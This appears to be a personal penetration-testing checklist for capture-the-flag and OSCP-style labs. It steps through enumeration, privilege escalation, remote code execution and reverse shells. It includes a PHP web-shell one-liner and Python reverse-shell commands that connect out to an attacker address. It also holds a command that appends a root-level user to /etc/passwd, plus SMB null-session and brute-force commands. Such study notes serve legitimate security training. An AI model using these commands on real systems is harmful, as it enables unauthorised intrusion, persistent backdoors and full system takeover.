# Checklist
# Preperation

<details>
  <summary>Expand</summary>

- [ ] Find IP of the machine
	- [ ] `export IP=<MACHINE_IP>`
	- [ ] `export MACHINE_NAME=<MACHINE_NAME>`
- [ ] Set folder structure
	- [ ] `cd ctf/`
	- [ ] `mkdir -p $MACHINE_NAME/enum`
	- [ ] `mkdir -p $MACHINE_NAME/files`
	- [ ] `touch $MACHINE_NAME/enum/users.txt`
	- [ ] `cp templates/report.md ctf/$MACHINE_NAME/${MACHINE_NAME}.md`
- [ ] Set hostname in etc/hosts (if helps)

</details>


# Enumeration

<details>
  <summary>Expand</summary>

<details>
  <summary>NMAP</summary>

- [Howto](../../active-information-gathering/nmap.md)
- Copy key findings to report
- check results
- Paste to [report](templates/report.md)
- Highlight exploitables/targets	

</details>	

<details>
  <summary>Rustscan</summary>

	- Test	

</details>	
	

<details>
  <summary>enum4linux</summary>
<br />

- [ ] `enum4linux $IP` -> users, share, comon structure, server block.
	- [ ] Highlights
	- [ ] check results
	- [ ] Check SMB null session
	- [ ] system level users	

</details>	


<details>
  <summary>nmap-nse</summary>
<br />

1. [ ] [Howto](active-information-gathering/nmap.md#nmap-nse)

</details>

<details>
  <summary>smb/netbio-ssn</summary>

	- Ports [139, 445]
	- `mkdir smb`
	- `nmap -p139,445 --script=smb-enum-shares $IP`
		- `smbclient //<IP>/IPC$ -N (/ADMINS/)` -> N: smb null session.
		- smbclient //'IP'/qui -N
		- crackmapexec
		- mfsconsole > use auxilaiary(scanner/smb/smb_login) > set pass rockyou.
	- `smbmap -H $IP`
	- `smbclient --no-pass -L //$IP`
	- `smbclient --no-pass \\\\$IP\\anonymous`
	- `smbclient \\\\$IP\\ITDEPT anonymous` [Tested]
	- `smbclient //192.168.10.10/sambashare` [without variable]
	- `mget file.name` [Download file.name]
	- `smbmap -u <user> -p <PassWord> -H $IP`
	- `smbclient //'IP'/<share> -U'user'%'password'`
	- `smbclient //$IP/secured -U <user>%<password> -c "prompt OFF;recurse ON;mget *"`	

</details>
	
<details>
  <summary>Apache Tomcat</summary>

	- Apache Tomcat [8080]
			- Read Version
			- Check URL (hints)
			- default credentials
			- mfsconsole /is it allowed?
	
</details>

<details>
  <summary>Domain</summary>

	- TODO
	
</details>

<details>
  <summary>ssl/pop3</summary>

	- TODO
	
</details>
	
<details>
  <summary>ssl/imap</summary>

	- TODO
	
</details>
	
<details>
  <summary>TOPIC</summary>

	- TODO
	
</details>
	
<details>
  <summary>	Morse code</summary>

	- Test	

</details>
	
<details>
  <summary>shellshock</summary>

- /cgi-bin
	- [ ] shellshock [Howto](../../foothold/shellshock/README.md)	
	

</details>
	
<details>
  <summary>SSH</summary>

	- hydra
		- [Howto](tools/bruteforce/ssh/hydra)
		- `curl -A "GoogleBot" http://$IP/robots.txt`
		- searchsploit
		- Port knocking
		- nmap port knock 

</details>
	

<details>
  <summary>WEB Enum</summary>
	
- Load each targetted port in browser
- export PORT=80
- `dirb http://$IP:$PORT/ -r`
- `nikto --host http://<IP> -C all` :: tool for webapp
- `export URL=${IP}:8080/FUZZ` or `export URL=${IP}:8080/FUZZ/`
	- HTTPS you will want to include protocol too
	- `wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 "$URL"`
	- `gobuster dir -u http://$IP -w /usr/share/dirbuster/wordlists/directory-list-1.0.txt`  :: helpful during bruteforce
	- framework/server/service -> searchexploit
	- Check for config through URL's like
	- hostname/username/re-use etc
- LFI
- check for ssh keys
- check for service/app configuration file (e.g: /etc/tomcat7/tomcat-users)
- vsftpd -> upload, to rce from upload file
- RFI
	- rev shell
		- https://www.revshells.com/
			- `python -c 'import pty;pty.spawn("/bin/bash")'`
	- `linpeas.sh`
- CUPS Http `631`

- Wordpress
	- wpscan

</details>

</details>


# Privilege Escalation

<details>
	<summary>Expand</summary>

- [ ] privileges escalation
	- [ ] `sudo -l`
	- [ ] password re-use
		- [ ] from credentials founds in enum
		- [ ] `su - <user>`
			- [ ] ***Stabilize Shell $***
				- [ ] `which python` -> python is here
				- [ ] `python -c 'import pty; pty.spawn("/bin/bash")'` -> import valid tty
				- [ ] `tty` quick test 
				- [ ] `export TERM=xterm-256color`  ⇾ export our terminal
				- [ ] `alias ll='clear ; ls -lsaht --color-auto'` ⇾ export ll command
				- [ ] `stty raw -echo; fg; reset` -> stable shell by control Z & backgrounding it
				- [ ] `stty columns 200 rows 200`
		- [ ] e.g: `sudo /usr/bin/mysql -e '\! /bin/sh'`  [sudo nopass for mysql](https://gtfobins.github.io/gtfobins/mysql/#sudo)
	- [ ] `netstat -tupanl | grep -i '127.0.0.1'` -> anything running on loopback
	- [ ] `find / -perm -u=s -type f 2>/dev/null` 
		- [ ] *_The first step is to identify all programs or files that have SUID bits enabled_*
			- [ ] example
				- [ ] /usr/bin/zsh
		- [ ] Read Source Code (if any)
		- [ ] look for files owned by root grouped by user.
		- [ ] `ps aux | grep -i 'root' --auto-color` <-- anything running as root?
			- [ ] lateral machines? (not done anything like this)
			- [ ] private ip address? (not done anything)
			- [ ] web root -> any db credes?
	- [ ] Take advantage of this misconfiguration by abusing the PATH variable
	- [ ] Take advantage of misconfigured cronjob.
	- [ ] `find / -perm -u=g -type f 2>/dev/null` -> Are there any GUID
	- [ ] File transfer
		- [ ] [Python http.server](../../tools/file-transfer#python-simple-http-server)
	- [ ] simple HTTP server
		- [ ] download pspy
		- [ ] Second shell -> `pspy<BIT>`
		- [ ] `getcap -r / 2>/dev/null` -> Are there any extended permissions
		- [ ] exploit miss-configuration
	- [ ] writeable `passwd`?
		- [ ] `perl -le 'print crypt("PassWord","addedsalt")'`
		- [ ] `echo "nullBrain:saltedvaluefromabove:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd`
	- [ ] Privilege escalation Enum
		- [ ] `https://github.com/diego-treitos/linux-smart-enumeration` (is this allowed in OSCP?)
		- [ ] `https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS`  (is this allowed in OSCP?)
	- [ ] `kernel exploits?`
		- [ ] https://github.com/mzet-/linux-exploit-suggester
		- [ ] e.g Dirty Cow [example HowTo](practical/dirty_cow)

</details>


# Remote Code Execution (RCE)

<details>
	<summary>Expand</summary>

- [ ] Remote Code Execution
	- [ ] `<?php system($_GET['cmd']);?>`
	- [ ] Verify RCE
		- [ ] e.g : `http://$IP/<path>/?lang=/var/ftp/pub/backdoor.php&cmd=id`.`
		- [ ] Payload:
			- [ ] https://github.com/nullbr41n/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
			- [ ] payload converter (hURL)
				- [ ] hURL -U export RHOST="$IP"; export RPORT="$PORT";python -c xxxx 
			- [ ] `python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'`
			- [ ] `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
</details>


# Reverse Shell

<details>
	<summary>Expand</summary>

- [ ] Reverse Shell
	- [ ] web uploads
		- [ ] `nc - nlvp 1` `Listening on port 1`
		- [ ] Upload payload on other side, should open connection
		- [ ] check RCE section.
			- [ ] ***Stabilize Shell $***
				- [ ] `which python` -> python is here
				- [ ] `python/python3 -c 'import pty; pty.spawn("/bin/bash")'` -> import valid tty
				- [ ] `tty` quick test
				- [ ] `export TERM=xterm-256color`  ⇾ export our terminal
				- [ ] `alias ll='clear ; ls -lsaht --color-auto'` ⇾ export ll command
				- [ ] `stty raw -echo; fg; reset` -> stable shell by control Z & backgrounding it
				- [ ] `stty columns 200 rows 200`

</details>
